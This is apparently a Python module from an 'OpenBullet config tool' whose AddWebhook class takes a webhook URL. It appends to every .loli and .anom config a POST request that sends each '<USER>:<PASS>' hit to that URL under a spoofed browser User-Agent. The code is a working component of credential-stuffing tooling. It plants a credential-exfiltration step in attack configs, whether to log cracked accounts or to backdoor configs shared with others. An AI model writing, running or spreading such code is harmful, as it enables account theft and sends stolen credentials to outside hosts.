from helpers import _clear,_setTitle,_printText,_copyFile,colors

class AddWebhook:
    def __init__(self,configs) -> None:
        _setTitle('[OPENBULLET CONFIG TOOL] ^| [AddWebhook]')
        _clear()
        title = colors['lpurple']+"""
                        ╔═══════════════════════════════════════════════════════════════════════╗
                                                  █████╗ ██████╗ ██████╗ 
                                                 ██╔══██╗██╔══██╗██╔══██╗
                                                 ███████║██║  ██║██║  ██║
                                                 ██╔══██║██║  ██║██║  ██║
                                                 ██║  ██║██████╔╝██████╔╝
                                                 ╚═╝  ╚═╝╚═════╝ ╚═════╝ 
                        ╚═══════════════════════════════════════════════════════════════════════╝
        """
        print(title)

        self.configs = configs
        self.webhook_url = str(input(f'{colors["lpurple"]}[>] {colors["bcyan"]}Webhook URL:{colors["lpurple"]} '))
        print('')

    #should change the append line function
    def _addWebhook(self):
        webhook_content = '''

REQUEST POST "'''+self.webhook_url+'''" 
  CONTENT "{\\"content\\":\\">>> ```<USER>:<PASS>```\\"}" 
  CONTENTTYPE "application/json" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*"'''

        for config in self.configs:
            if config.endswith('.loli') or config.endswith('.anom'):
                _copyFile(f'[Configs]/{config}',f'[AddWebhook]/{config}')
                with open(f'[AddWebhook]/{config}','a',encoding='utf8',errors='ignore') as f:
                    f.write(webhook_content)
                _printText(colors['bcyan'],colors['lpurple'],'ADDED',config)

    def _start(self):
        self._addWebhook()